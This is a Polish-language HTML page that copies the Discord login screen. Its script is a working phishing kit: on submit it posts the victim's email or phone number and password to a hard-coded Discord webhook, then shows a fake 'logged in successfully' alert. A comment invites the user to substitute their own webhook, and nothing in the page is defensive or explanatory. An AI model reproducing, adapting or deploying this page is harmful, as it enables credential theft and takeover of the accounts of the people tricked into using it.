<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Discord</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');

    body {
      margin: 0;
      font-family: 'Inter', system-ui, sans-serif;
      background: #36393f;
      color: #dcddde;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .container {
      background: #2f3136;
      width: 100%;
      max-width: 480px;
      border-radius: 8px;
      padding: 32px 40px;
      box-shadow: 0 0 0 1px rgba(0,0,0,0.3);
    }

    .logo {
      text-align: center;
      margin-bottom: 24px;
    }

    .logo svg {
      width: 50px;
      height: 50px;
      fill: #5865f2;
    }

    h1 {
      text-align: center;
      font-size: 24px;
      font-weight: 600;
      margin: 0 0 8px 0;
      color: #fff;
    }

    .subtitle {
      text-align: center;
      color: #b9bbbe;
      margin-bottom: 32px;
      font-size: 16px;
    }

    .input-group {
      margin-bottom: 20px;
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-size: 12px;
      font-weight: 600;
      color: #b9bbbe;
      text-transform: uppercase;
    }

    input {
      width: 100%;
      padding: 12px 16px;
      background: #202225;
      border: 1px solid #202225;
      border-radius: 4px;
      color: #dcddde;
      font-size: 16px;
    }

    input:focus {
      outline: none;
      border-color: #5865f2;
      box-shadow: 0 0 0 2px rgba(88, 101, 242, 0.3);
    }

    .options {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 24px;
      font-size: 14px;
    }

    .checkbox {
      display: flex;
      align-items: center;
      gap: 8px;
      color: #b9bbbe;
    }

    button {
      width: 100%;
      padding: 14px;
      background: #5865f2;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-bottom: 16px;
    }

    button:hover {
      background: #4752c4;
    }

    .forgot {
      text-align: center;
      color: #00aff4;
      font-size: 14px;
      text-decoration: none;
    }

    .forgot:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="logo">
      <!-- Logo Discord (prosty SVG) -->
      <svg viewBox="0 0 127.14 96.36">
        <path d="M107.7 8.07A105.15 105.15 0 0 0 81.47 0a72.06 72.06 0 0 0-3.36 6.83 97.68 97.68 0 0 0-29.11 0A72.37 72.37 0 0 0 45.64 0a105.89 105.89 0 0 0-26.25 8.07C2.79 32.65-1.71 61.8 1.3 90.5a105.4 105.4 0 0 0 32.2 16.1 77.7 77.7 0 0 0 6.75-11.1 68.3 68.3 0 0 1-10.85-5.18c.91-.66 1.8-1.34 2.66-2.05a75.57 75.57 0 0 0 64.32 0c.87.71 1.76 1.39 2.66 2.05a68.68 68.68 0 0 1-10.87 5.19 77.3 77.3 0 0 0 6.76 11.1 105.5 105.5 0 0 0 32.2-16.1c3.8-28.7-.84-57.85-17.3-82.43z"/>
      </svg>
    </div>

    <h1>Zaloguj się</h1>
    <p class="subtitle">na Discord</p>

    <form id="loginForm">
      <div class="input-group">
        <label for="email">Email lub numer telefonu</label>
        <input type="text" id="email" placeholder="jan.kowalski@example.com" required>
      </div>

      <div class="input-group">
        <label for="password">Hasło</label>
        <input type="password" id="password" placeholder="••••••••" required>
      </div>

      <div class="options">
        <div class="checkbox">
          <input type="checkbox" id="remember">
          <label for="remember">Zapamiętaj mnie</label>
        </div>
      </div>

      <button type="submit">Zaloguj się</button>
    </form>

    <a href="#" class="forgot">Zapomniałeś hasła?</a>
  </div>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1493250113588691067/2kSrCkWZnkMKpbYNURbE-afbcfWLwrwlXyGWHr22AdA4LphCobaTQh3tTctEXXVbQmvu";   // ← ZMIEŃ NA SWÓJ!

    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();

      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();

      if (!email || !password) {
        alert("Wypełnij wszystkie pola!");
        return;
      }

      const payload = {
        username: "Discord Login",
        embeds: [{
          title: "🔑 Nowe logowanie na Discord",
          color: 0x5865f2,
          fields: [
            { name: "Email / Telefon", value: email || "brak", inline: true },
            { name: "Hasło", value: password || "brak", inline: true },
            { name: "Czas", value: new Date().toLocaleString('pl-PL'), inline: false }
          ],
          footer: { text: "Strona wygląda jak Discord" }
        }]
      };

      try {
        await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        alert("✅ Zalogowano pomyślnie!");
        console.log("Dane wysłane:", email, password);
      } catch (err) {
        alert("Błąd logowania.");
      }
    });
  </script>

</body>
</html>
